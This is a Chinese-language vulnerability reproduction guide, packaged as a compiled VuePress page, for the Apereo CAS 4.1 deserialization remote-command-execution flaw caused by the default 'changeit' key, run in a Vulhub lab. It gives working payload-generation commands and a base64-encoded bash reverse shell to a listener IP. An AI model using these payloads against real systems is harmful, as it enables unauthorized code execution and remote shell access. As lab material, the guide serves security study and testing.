import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c as l,a as e,b as a,d as n,e as r}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。",-1),u=e("p",null,"参考链接：",-1),h={href:"https://apereo.github.io/2016/04/08/commonsvulndisc/",target:"_blank",rel:"noopener noreferrer"},b=r(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Apereo CAS 4.1.5：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="写入文件" tabindex="-1"><a class="header-anchor" href="#写入文件" aria-hidden="true">#</a> 写入文件</h3><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);
        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,8),v={href:"https://github.com/vulhub/Apereo-CAS-Attack",target:"_blank",rel:"noopener noreferrer"},m=r(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/awesome_poc&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231437193.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后登录Apereo CAS并抓包（默认用户名/密码为casuser/Mellon），将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211634315.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登录Apereo CAS，touch /tmp/success已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211636651.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="写入反弹shell" tabindex="-1"><a class="header-anchor" href="#写入反弹shell" aria-hidden="true">#</a> 写入反弹shell</h3><p>构造反弹shell并进行base64编码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1  (base64编码)
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231437964.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>监听端口，成功反弹shell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211640018.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function g(f,_){const i=s("ExternalLinkIcon");return o(),l("div",null,[c,p,u,e("ul",null,[e("li",null,[e("a",h,[a("https://apereo.github.io/2016/04/08/commonsvulndisc/"),n(i)])])]),b,e("p",null,[a("使用"),e("a",v,[a("Apereo-CAS-Attack"),n(i)]),a("来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：")]),m])}const A=t(d,[["render",g],["__file","Apereo CAS 4.1 反序列化命令执行漏洞.html.vue"]]);export{A as default};
